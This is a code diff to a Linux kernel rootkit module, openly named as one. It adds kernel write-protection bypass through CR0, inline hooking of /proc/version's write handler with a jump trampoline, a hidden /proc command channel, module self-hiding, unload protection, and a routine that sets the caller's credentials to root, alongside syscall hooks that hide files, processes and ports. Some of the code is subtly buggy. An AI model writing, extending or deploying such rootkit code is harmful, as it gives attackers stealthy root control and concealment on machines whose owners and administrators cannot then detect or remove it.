@@ -27,6 +27,21 @@
 #define exist(name, param) \
     exist_##name((param))
 
+static long orig_cr0 = 0;
+
+void mywrite_cr0(unsigned long cr0) {
+    asm volatile("mov %0,%%cr0" : "+r"(cr0));
+}
+
+void disable_write_protection(void) {
+    orig_cr0 = read_cr0();
+    mywrite_cr0(orig_cr0 & (~0x10000)); //set wp to 0
+}
+
+void enable_write_protection(void) {
+    mywrite_cr0(orig_cr0);          //set wp to 1
+}
+
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
@@ -97,12 +112,12 @@ struct hide_ports {
 };
 
 /* ---------------hide module start ----------------*/
-void hideme(void) {
+static void hideme(void) {
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
 }
 
-void showme(void) {
+static void showme(void) {
     list_add_tail(&THIS_MODULE->list, prev_module);
 }
 
@@ -333,11 +348,11 @@ static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
 
 /*---------------rootkit protect start----------------*/
 
-void rootkit_protect(void) {
+static void rootkit_protect(void) {
     try_module_get(THIS_MODULE);
 }
 
-void rootkit_unload(void) {
+static void rootkit_unload(void) {
     module_put(THIS_MODULE);
 }
 
@@ -416,8 +431,8 @@ static unsigned int execute(char *cmd, int idx) {
             if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
                 str[i] = '\0';
         target_file = exist(hide_files, (char *)str + idx);
-        if (target != NULL) {
-            list_del(&target->list);
+        if (target_file != NULL) {
+            list_del(&target_file->list);
         }
     } else if (strcmp(cmd, "hide_pid") == 0) {
         for (i = idx; i < strlen(str); i++) 
@@ -446,8 +461,6 @@ static unsigned int execute(char *cmd, int idx) {
 }
 
 /*---------------read and write on proc start-----------------*/
-static ssize_t (*orig_read) (struct file *, const char __user *, size_t, loff_t *);
-static ssize_t (*orig_write) (struct file *, const char __user *, size_t, loff_t *);
 
 static ssize_t write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
     int i;
@@ -465,12 +478,17 @@ static ssize_t write(struct file *file, const char __user *buffer, size_t count,
     strncpy(cmd, str, i);
     cmd[i] = '\0';
     if (!execute(cmd, i + 1)) {
-        return orig_write(file, buffer, count, f_pos);
+        return count;
     }
 
     printk(KERN_INFO "write from user: %s\n", str);
     return count;
 }
+
+// static ssize_t fops_read(struct file *file, char __user *buffer, size_t count, loff_t *f_pos) {
+//     printk(KERN_INFO "fops_read\n");
+//     return orig_read(file, buffer, count, f_pos);
+// }
 
 static int proc_show(struct seq_file *m, void *v) {
     seq_printf(m, str);
@@ -492,38 +510,118 @@ static const struct file_operations file_fops = {
 /*---------------read and write on proc end----------------*/
 
 /*---------------setup_channel---------------------------*/
-// static struct rb_node *entry;
+static struct rb_node *entry;
 
-// static int setup_channel(void) {
-//     static const struct file_operations proc_file_fops;
-//     static struct file_operations *proc_fops;
+    // mov rax 0x0000000000000000    \x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00
+    // jmp rax \xff\xe0
+static char *hook_code = "\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xe0";
 
-//     struct proc_dir_entry *proc_entry = proc_create("tmp", 0444, NULL, &proc_file_fops);
-//     proc_entry = proc_entry->parent;
-//     printk(KERN_INFO "%s", proc_entry->name);
-//     // BUG_ON(memcmp(proc_entry->name, "/proc", 5) == 0);
+static ssize_t (*orig_write) (struct file *, const char __user *, size_t, loff_t *);
+char original_code[sizeof(hook_code) - 1];
 
-//     // find /proc/version
-//     entry = rb_first(&proc_entry->subdir);
-//     while (entry) {
-//         if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, "version") == 0) {
-//             proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
-//             break;
-//         }
-//         entry = rb_next(entry);
-//     }
+static ssize_t fops_write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos);
 
-//     if (proc_fops->write) {
-//         orig_write = proc_fops->write;
-//         proc_fops->write = &write;
-//     }
+void hook_proc_rw(void) {
+    disable_write_protection();
+    memcpy(original_code, orig_write, sizeof(hook_code) - 1);
+    memcpy(orig_write, hook_code, sizeof(hook_code) - 1);
+    //orig_write[2] = fops_write;
+    *(void **)&((char *)orig_write)[2] = fops_write;
+    enable_write_protection();
+}
 
-//     if (!proc_fops->read && !proc_fops->write) {
-//         printk(KERN_INFO "/proc/version has no write nor read function\n");
-//         return -1;
-//     }
-//     return 0;
-// }
+void unhook_proc_rw(void) {
+    disable_write_protection();
+    memcpy(orig_write, original_code, sizeof(hook_code) - 1);
+    enable_write_protection();
+}
+
+static ssize_t fops_write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
+    printk(KERN_INFO "fops_write\n");
+    int i;
+    char *cmd;    
+    ssize_t ret;
+    memset(str, 0x0, 100);
+    if (copy_from_user(str, buffer, count)) {
+        return -1;
+    }
+    
+    for (i = 0; i < strlen(str); i++) {
+        if (*(str + i) == ' ' || *(str + i) == '\r' || *(str + i) == '\n')
+            break;
+    }
+    cmd = kzalloc(i + 1, GFP_KERNEL);
+    strncpy(cmd, str, i);
+    cmd[i] = '\0';
+    if (execute(cmd, i + 1))
+        return count;
+    
+    unhook_proc_rw();
+    ret = orig_write(file, buffer, count, f_pos);
+    hook_proc_rw();
+    return ret;
+}
+
+static int setup_channel(void) {
+    //struct rb_node *entry;
+    const struct file_operations proc_file_fops;
+    struct file_operations *proc_fops;
+    struct proc_dir_entry *proc_entry = proc_create("tmp", 0444, NULL, &proc_file_fops);
+
+    proc_entry = proc_entry->parent;
+    //printk(KERN_INFO "%s", proc_entry->name);
+    // BUG_ON(memcmp(proc_entry->name, "/proc", 5) == 0);
+
+    // find /proc/version
+    entry = rb_first(&proc_entry->subdir);
+    while (entry) {
+        if (strcmp(rb_entry(entry, struct proc_dir_entry, subdir_node)->name, "version") == 0) {
+            proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+            goto found;
+        }
+        entry = rb_next(entry);
+    }
+    // unreachable code
+    return -1;
+
+found:
+    printk(KERN_INFO "found\n ");
+    if (proc_fops->write) {
+        hook_proc_rw();
+        // orig_write = proc_fops->write;
+        // proc_fops->write = fops_write;
+    } 
+
+    // if (proc_fops->read) {
+    //     orig_read = proc_fops->read;
+    //     proc_fops->read = fops_read;
+    // }
+    
+    if (!proc_fops->write) {
+        printk(KERN_INFO "/proc/version has no write nor read function\n");
+        return -1;
+    }
+    return 0;
+}
+
+void set_root(void)
+{
+    /* prepare_creds returns the current credentials of the process */
+    struct cred *root;
+    root = prepare_creds();
+
+    if (root == NULL)
+        return;
+
+    /* Run through and set all the various *id's to 0 (root) */
+    root->uid.val = root->gid.val = 0;
+    root->euid.val = root->egid.val = 0;
+    root->suid.val = root->sgid.val = 0;
+    root->fsuid.val = root->fsgid.val = 0;
+
+    /* Set the cred struct that we've modified to that of the calling process */
+    commit_creds(root);
+}
 
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_getdents64", hook_sys_getdents64, &orig_getdents64),
@@ -540,9 +638,10 @@ static struct ftrace_hook hooks[] = {
 static int __init rootkit_init(void) {
     int err;
     struct proc_dir_entry *entry;
-
-    //setup_channel();
-    printk(KERN_INFO "setup_channel successfully\n");
+    struct hide_files *chan;
+    // set_root();
+    // setup_channel();
+    // printk(KERN_INFO "setup_channel successfully\n");
     // create channel under /proc
     str = kzalloc(100, GFP_KERNEL);
     entry = proc_create("channel", 0666, NULL, &file_fops);
@@ -552,6 +651,9 @@ static int __init rootkit_init(void) {
     } else {
         printk(KERN_INFO "channel create successfully\n");
     }
+    chan = kmalloc(sizeof(struct hide_files), GFP_KERNEL);
+    memcpy(chan->name, "channel", 8);
+    list_add(&chan->list, &hide_files_list);
 
     //hook syscalls in kernel
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
@@ -570,8 +672,8 @@ static void __exit rootkit_exit(void) {
     static struct file_operations *proc_fops;
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     remove_proc_entry("channel", NULL);
-    // proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
-    // proc_fops->write = orig_write;
+    proc_fops = (struct file_operations *) rb_entry(entry, struct proc_dir_entry, subdir_node)->proc_fops;
+    proc_fops->write = orig_write;
     printk(KERN_INFO "rootkit: Unloaded :-(\n");
 }
 
